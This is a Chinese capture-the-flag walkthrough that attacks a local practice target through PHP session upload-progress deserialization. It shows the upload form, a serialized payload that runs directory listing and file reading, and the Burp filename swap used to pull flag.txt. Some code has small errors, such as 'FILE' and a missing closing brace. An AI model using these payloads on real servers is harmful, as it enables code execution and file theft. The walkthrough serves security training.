1. 在本地构建一个表单：

```html
<form action="http://127.0.0.1/ctf/1.php" method="POST" enctype="multipart/form-data">
	<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="ryat" />
	<input type="file" name="file" />
	<input type="submit" />
</form>

```
<br>
2. 构造 payload：

```php
<?php

error_reporting(0);

ini_set('session.serialize_handler', 'php_serialize');  
session_start();

class OowoO
{
    public $mdzz = 'print_r(scandir(dirname(FILE)))';
}
$obj = new OowoO;
echo serialize($obj);  

// Out: O:5:"OowoO":1:{s:4:"mdzz";s:31:"print_r(scandir(dirname(FILE)))";}

?>

```
<br>

3. 本地打开表单后，随便提交一个文件，然后使用 burp 抓包将 filename 的值改成 Payload 值：

`O:5:"OowoO":1:{s:4:"mdzz";s:31:"print_r(scandir(dirname(FILE)))";}`

```php
// Ex:

Array
(
    [0] => .
    [1] => ..
    [2] => .idea
    [3] => flag.txt
    [4] => xlhtext.php
)

```
<br>
4. 再通过 `phpinfo()` 找到文件的绝对路径：

```php
//EX:

SCRIPT_FILENAME             E:/phpstudy/PHPTutorial/WWW/web/03-fxlh-1.php  
OR
_SERVER["SCRIPT_FILENAME"]  E:/phpstudy/PHPTutorial/WWW/web/03-fxlh-1.php 

```
<br>
5. 构建 Payload 提取 Flag：

```oho
print_r(file_get_contents("E:/phpstudy/PHPTutorial/WWW/web/flag.txt"))

// 序列化：

O:5:"OowoO":1:{s:4:"mdzz";s:70:"print_r(file_get_contents("E:/phpstudy/PHPTutorial/WWW/web/flag.txt"))";

```
输出 Flag
